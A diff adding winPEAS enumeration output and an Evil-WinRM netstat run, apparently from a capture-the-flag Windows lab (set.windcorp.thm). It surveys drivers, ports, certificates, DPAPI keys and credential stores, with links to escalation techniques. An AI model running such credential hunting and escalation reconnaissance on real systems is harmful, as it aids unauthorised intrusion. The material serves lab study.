@@ -5196,3 +5196,1736 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
    =================================================================================================
 
     Folder: C:\windows\tasks
+    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+   =================================================================================================
+
+    Folder: C:\windows\system32\tasks
+    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+   =================================================================================================
+
+    Folder: C:\windows
+    File: C:\windows\system.ini
+   =================================================================================================
+
+    Folder: C:\windows
+    File: C:\windows\win.ini
+   =================================================================================================
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
+È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                        
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft--
+È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#vulnerable-drivers                                                           
+    XENBUS - 8.2.7.58 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenbus.sys
+    XEN - 8.2.7.58 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xen.sys
+    XENFILT - 8.2.7.58 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenfilt.sys
+    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys                                                                                                       
+    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
+    QLogic FastLinQ Ethernet - 8.33.20.103 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qevbda.sys                                                                                                            
+    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys                                                                                                   
+    VMware PCI VMCI Bus Device - 9.8.16.0 build-14168184 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys                                                                                                
+    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys                                                                                            
+     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys                                                                                        
+    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
+    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys                                                                                                     
+    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys                                                                                                      
+    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys                                                                                  
+    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys                                                                                                         
+    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys                                                                                           
+    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys                                                                                             
+    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys                                                                                             
+    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys                                                                                          
+    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys                                                                                             
+    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys                                                                                   
+    MEGASAS RAID Controller Driver for Windows - 6.714.05.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys                                                                                 
+    MEGASAS RAID Controller Driver for Windows - 7.705.08.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys                                                                                
+    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys                                                                                                 
+    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys                                                                                            
+    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys                                                                                                   
+    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys                                                                                 
+    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys                                                                                 
+    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys                                                                              
+    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys                                                                                 
+    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys                                                                                                     
+    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys                                                                                             
+    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys                                                                            
+    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1010 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys                                                                           
+    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys                                                                             
+    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys                                                                
+    Emulex WS2K12 Storport Miniport Driver x64 - 11.4.225.8009 11/15/2017 WS2K12 64 bit x64 [Broadcom]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys                                                              
+    QLogic iSCSI offload driver - 8.33.5.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qeois.sys                                                                                                       
+    QLogic Fibre Channel Stor Miniport Driver - 9.1.15.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys                                                                                       
+    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys                                                                                    
+    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys                                                                                          
+    XENVBD - 8.3.1.56 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenvbd.sys
+    XENCRSH - 8.3.1.56 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xencrsh.sys
+    Amazon NVMe Storage Driver - V1.3.2 [Amazon]: \\.\GLOBALROOT\SystemRoot\System32\drivers\AWSNVMe.sys
+    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys                                                                                 
+    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS                                                                                                            
+    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
+    SmartRAID, SmartHBA PQI Storport Driver - 1.50.0.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys                                                                                   
+    QLogic FCoE offload driver - 8.33.4.2 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qefcoe.sys                                                                                                             
+    QLogic iSCSI offload driver - 7.14.7.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys                                                                                                       
+    QLogic FCoE Offload driver - 7.14.15.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys                                                                                                      
+    XENVIF - 8.2.8.27 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenvif.sys
+    XENIFACE - 8.2.5.39 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xeniface.sys
+    XENNET - 8.2.5.32 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xennet.sys
+
+ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
+  [X] Exception: Access denied 
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI)
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts
+È The masks are only for the IPv4 addresses 
+    Ethernet[02:89:25:66:2C:0D]: 10.10.242.97, fe80::385b:3ba3:a213:500a%9 / 255.255.0.0
+        Gateways: 10.10.0.1
+        DNSs: 10.0.0.2
+        Known hosts:
+          10.10.0.1             02-C8-85-B5-5A-AA     Dynamic
+          10.10.255.255         FF-FF-FF-FF-FF-FF     Static
+          172.30.16.1           00-00-00-00-00-00     Invalid
+          224.0.0.22            01-00-5E-00-00-16     Static
+          224.0.0.251           01-00-5E-00-00-FB     Static
+          224.0.0.252           01-00-5E-00-00-FC     Static
+          255.255.255.255       FF-FF-FF-FF-FF-FF     Static
+
+    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
+        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
+        Known hosts:
+          224.0.0.22            00-00-00-00-00-00     Static
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
+È Check for services restricted from the outside 
+  Enumerating IPv4 connections
+                                                                                                              
+  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
+
+  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               135           0.0.0.0               0               Listening         988             svchost
+  TCP        0.0.0.0               443           0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               2805          0.0.0.0               0               Listening         5060            Veeam.One.Agent.Service
+  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         764             svchost
+  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         692             wininit
+  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1064            svchost
+  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         788             lsass
+  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         852             svchost
+  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         1340            spoolsv
+  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         772             services
+  TCP        10.10.242.97          139           0.0.0.0               0               Listening         4               System
+  TCP        10.10.242.97          2805          10.10.242.97          49719           Established       5060            Veeam.One.Agent.Service
+
+  Enumerating IPv6 connections
+                                                                                                              
+  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name
+
+  TCP        [::]                                        80            [::]                                        0               Listening         4               System
+  TCP        [::]                                        135           [::]                                        0               Listening         988             svchost
+  TCP        [::]                                        443           [::]                                        0               Listening         4               System
+  TCP        [::]                                        445           [::]                                        0               Listening         4               System
+  TCP        [::]                                        3389          [::]                                        0               Listening         764             svchost
+  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
+  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
+  TCP        [::]                                        49664         [::]                                        0               Listening         692             wininit
+  TCP        [::]                                        49665         [::]                                        0               Listening         1064            svchost
+  TCP        [::]                                        49666         [::]                                        0               Listening         788             lsass
+  TCP        [::]                                        49667         [::]                                        0               Listening         852             svchost
+  TCP        [::]                                        49669         [::]                                        0               Listening         1340            spoolsv
+  TCP        [::]                                        49670         [::]                                        0               Listening         772             services
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports
+È Check for services restricted from the outside 
+  Enumerating IPv4 connections
+                                                                                                              
+  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name
+
+  UDP        0.0.0.0               123           *:*                            2148              svchost
+  UDP        0.0.0.0               500           *:*                            852               svchost
+  UDP        0.0.0.0               3389          *:*                            764               svchost
+  UDP        0.0.0.0               4500          *:*                            852               svchost
+  UDP        0.0.0.0               5353          *:*                            1312              svchost
+  UDP        0.0.0.0               5355          *:*                            1312              svchost
+  UDP        10.10.242.97          137           *:*                            4                 System
+  UDP        10.10.242.97          138           *:*                            4                 System
+  UDP        127.0.0.1             52950         *:*                            852               svchost
+
+  Enumerating IPv6 connections
+                                                                                                              
+  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name
+
+  UDP        [::]                                        123           *:*                            2148              svchost
+  UDP        [::]                                        500           *:*                            852               svchost
+  UDP        [::]                                        3389          *:*                            764               svchost
+  UDP        [::]                                        4500          *:*                            852               svchost
+  UDP        [::]                                        5353          *:*                            1312              svchost
+  UDP        [::]                                        5355          *:*                            1312              svchost
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules
+È Showing only DENY rules (too many ALLOW rules always) 
+    Current Profiles: PUBLIC
+    FirewallEnabled (Domain):    True
+    FirewallEnabled (Private):    True
+    FirewallEnabled (Public):    True
+    DENY rules:
+  [X] Exception: Object reference not set to an instance of an object.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70--
+    Entry                                 Name                                  Data
+  [X] Exception: Access denied 
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration
+  General Settings
+  Hive        Key                                       Value
+  HKCU        DisableCachingOfSSLPages                  1
+  HKCU        IE5_UA_Backup_Flag                        5.0
+  HKCU        PrivacyAdvanced                           1
+  HKCU        SecureProtocols                           2688
+  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+  HKCU        CertificateRevocation                     1
+  HKCU        ZonesSecurityUpgrade                      System.Byte[]
+  HKCU        EnableNegotiate                           1
+  HKCU        MigrateProxy                              1
+  HKCU        ProxyEnable                               0
+  HKCU        WarnonZoneCrossing                        1
+  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
+  HKLM        CodeBaseSearchPath                        CODEBASE
+  HKLM        EnablePunycode                            1
+  HKLM        MinorVersion                              0
+  HKLM        WarnOnIntranet                            1
+
+  Zone Maps                                                                                                   
+  No URLs configured
+
+  Zone Auth Settings                                                                                          
+  No Zone Auth Settings
+
+ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault                                                                                                       
+  [ERROR] Unable to enumerate vaults. Error (0x1061)
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault                                                                                                       
+    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
+
+  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'
+Please run:
+cmdkey /list
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings
+  RDP Server Settings
+    Network Level Authentication            :
+    Block Clipboard Redirection             :
+    Block COM Port Redirection              :
+    Block Drive Redirection                 :
+    Block LPT Port Redirection              :
+    Block PnP Device Redirection            :
+    Block Printer Redirection               :
+    Allow Smart Card Redirection            :
+
+  RDP Client Settings                                                                                         
+    Disable Password Saving                 :       True
+    Restricted Remote Administration        :       False
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
+    MasterKey: C:\Users\MichelleWat\AppData\Roaming\Microsoft\Protect\S-1-5-21-2146754214-159084425-2869734154-2014\670e597a-66e1-4e6b-8ec9-ff9e51a7d92e
+    Accessed: 6/15/2020 11:12:07 AM
+    Modified: 6/15/2020 11:12:07 AM
+   =================================================================================================
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for RDCMan Settings Files
+È Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager                                                
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Kerberos tickets
+È  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
+  [X] Exception: Object reference not set to an instance of an object.
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for saved Wifi credentials
+  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)                                                                                            
+Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
+No saved Wifi credentials found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking AppCmd.exe
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe
+    AppCmd.exe was found in C:\windows\system32\inetsrv\appcmd.exe
+      You must be an administrator to run this check
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking SSClient.exe
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating SSCM - System Center Configuration Manager settings
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials
+  [X] Exception: Couldn't parse nt_resp. Len: 0 Message bytes: 4e544c4d5353500003000000010001005e000000000000005f000000000000005800000000000000580000000600060058000000000000005f000000058a80a20a0063450000000fd0d07d1eedade3358b1f3dbc7ca717cf53004500540000                                                                             
+
+ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))                                                                                                  
+   --- End of inner exception stack trace ---                                                                 
+   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)                                            
+   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                
+   at fk.l()                                                                                                  
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
+    http://go.microsoft.com/fwlink/p/?LinkId=255142
+
+ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty SSH Host keys
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ SSH keys in registry
+È If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry                                     
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ SuperPutty configuration files
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Office 365 endpoints synced by OneDrive.
+                                                                                                              
+    SID: S-1-5-19
+   =================================================================================================
+
+    SID: S-1-5-20
+   =================================================================================================
+
+    SID: S-1-5-21-2146754214-159084425-2869734154-1001
+   =================================================================================================
+
+    SID: S-1-5-21-2146754214-159084425-2869734154-2014
+   =================================================================================================
+
+    SID: S-1-5-18
+   =================================================================================================
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for common SAM & SYSTEM backups
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for McAfee Sitelist.xml Files
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached GPP Passwords
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry
+    Not Found
+    Not Found
+    Not Found
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
+    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching for Oracle SQL Developer config files
+                                                                                                              
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Slack files & directories
+  note: check manually if something is found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for LOL Binaries and Scripts (can be slow)
+È  https://lolbas-project.github.io/
+   [!] Check skipped, if you want to run it, please specify '-lolbas' argument
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Outlook download files
+                                                                                                              
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files
+                                                                                                              
+  Issuer             : CN=set.windcorp.thm
+  Subject            : CN=set.windcorp.thm
+  ValidDate          : 6/7/2020 8:00:22 AM
+  ExpiryDate         : 10/7/2036 8:10:21 AM
+  HasPrivateKey      : True
+  StoreLocation      : LocalMachine
+  KeyExportable      : True
+  Thumbprint         : 95714370BD9BCC8008EF7D1E0DFCBBC2251CE077
+
+  Enhanced Key Usages
+       Client Authentication     [*] Certificate is used for client authentication!
+       Server Authentication
+   =================================================================================================
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for documents --limit 100--
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Office Most Recent Files -- limit 50
+                                                                                                              
+  Last Access Date           User                                           Application           Document
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Recent files --limit 70--
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking inside the Recycle Bin for creds files
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)
+                                                                                                              
+     C:\Users\Default User
+     C:\Users\Default
+     C:\Users\All Users
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching interesting files in other users home directories (can be slow)
+                                                                                                              
+  [X] Exception: Object reference not set to an instance of an object.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)                                                                                                            
+     File Permissions "C:\Users\MichelleWat\Desktop\winPEASany_ofs.exe": MichelleWat [AllAccess]
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Linux shells/distributions - wsl.exe, bash.exe
+
+ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ File Analysis ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Found SSH AGENTS Files
+File: C:\Users\All Users\Veeam\OneAgent\Packages\Veeam.One.Agent.Package.Powershell.package
+File: C:\Users\All Users\Veeam\OneAgent\Packages\Veeam.One.Agent.Package.LogAnalyzer.package
+File: C:\Users\All Users\Veeam\OneAgent\Log\3be6b89b-e6de-4e97-bcd4-5c14e9d97fc1\OneAgent.log
+
+*Evil-WinRM* PS C:\Users\MichelleWat\Documents> netstat -ano
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       988
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:2805           0.0.0.0:0              LISTENING       5060
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       764
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       692
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1064
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       788
